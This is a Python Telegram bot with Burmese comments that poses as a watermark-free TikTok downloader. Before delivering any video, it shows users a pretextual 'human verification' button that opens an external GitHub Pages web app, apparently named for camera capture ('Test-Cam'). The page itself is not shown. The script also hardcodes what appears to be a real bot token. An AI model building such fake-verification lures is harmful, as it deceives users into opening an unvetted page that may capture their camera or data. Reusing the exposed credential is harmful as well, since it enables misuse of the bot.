import telebot
import requests
from telebot import types

# --- ပြင်ဆင်ရန် အပိုင်း ---
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
# သင့်ရဲ့ GitHub Pages Link ကို ဒီမှာ အမှန်ထည့်ပါ
WEB_APP_URL = "https://tar-alt.github.io/Test-Cam/" 
# -----------------------

bot = telebot.TeleBot(BOT_TOKEN)

# ဗီဒီယို Link များကို ခေတ္တသိမ်းဆည်းရန်
pending_videos = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🌟 *Ultra HD TikTok Downloader*\n\n"
        "TikTok Link ပို့ပေးရုံနဲ့ Watermark မပါတဲ့ HD ဗီဒီယိုတွေကို ဒေါင်းလုဒ်ဆွဲနိုင်ပါပြီ။"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: "tiktok.com" in message.text)
def handle_tiktok(message):
    user_id = message.chat.id
    url = message.text
    
    # ပို့လိုက်တဲ့ Link ကို မှတ်ထားမယ်
    pending_videos[user_id] = url
    
    # Verification ခလုတ် (WebApp) ပြုလုပ်ခြင်း
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=WEB_APP_URL)
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", web_app=web_app)
    markup.add(verify_btn)
    
    verify_text = (
        "⚠️ *Verification Required*\n\n"
        "စနစ်လုံခြုံရေးအရ လူဟုတ်မဟုတ် စစ်ဆေးရန် လိုအပ်ပါသည်။\n"
        "အောက်ကခလုတ်ကိုနှိပ်ပြီး Continue လုပ်ပေးပါ။ ပြီးမှ ဗီဒီယို ပို့ပေးမည် ဖြစ်ပါသည်။"
    )
    bot.reply_to(message, verify_text, reply_markup=markup, parse_mode="Markdown")

# Website ကနေ အောင်မြင်ကြောင်း စာပို့လာရင် ဗီဒီယို ဒေါင်းပေးမယ့်အပိုင်း
@bot.message_handler(func=lambda message: message.text == "✅ Verification_Success")
def process_download(message):
    user_id = message.chat.id
    
    if user_id in pending_videos:
        url = pending_videos[user_id]
        status_msg = bot.send_message(user_id, "🚀 Verification အောင်မြင်ပါသည်။ ဗီဒီယိုကို HD ဖြင့် ဒေါင်းလုဒ်ဆွဲနေသည်...")
        
        try:
            api_url = f"https://www.tikwm.com/api/?url={url}&hd=1"
            res = requests.get(api_url).json()
            if res.get('code') == 0:
                video_url = res['data'].get('play') 
                bot.send_video(
                    user_id, 
                    video_url, 
                    caption="✅ *ဒေါင်းလုဒ် အောင်မြင်ပါပြီ!*\n\nCreated by: [Taro](https://t.me/Yes_is_me_Taro)", 
                    parse_mode="Markdown"
                )
                bot.delete_message(user_id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ ဗီဒီယို ရှာမတွေ့ပါ။ Link ကို ပြန်စစ်ပါ။", user_id, status_msg.message_id)
        except:
            bot.edit_message_text("⚠️ စနစ်ချို့ယွင်းချက် ရှိနေပါသည်။", user_id, status_msg.message_id)
        
        # အလုပ်ပြီးရင် link ကို storage ထဲက ဖျက်မယ်
        del pending_videos[user_id]
    else:
        bot.send_message(user_id, "အရင်ဆုံး TikTok Link ပို့ပေးပါ။")

bot.polling(none_stop=True)
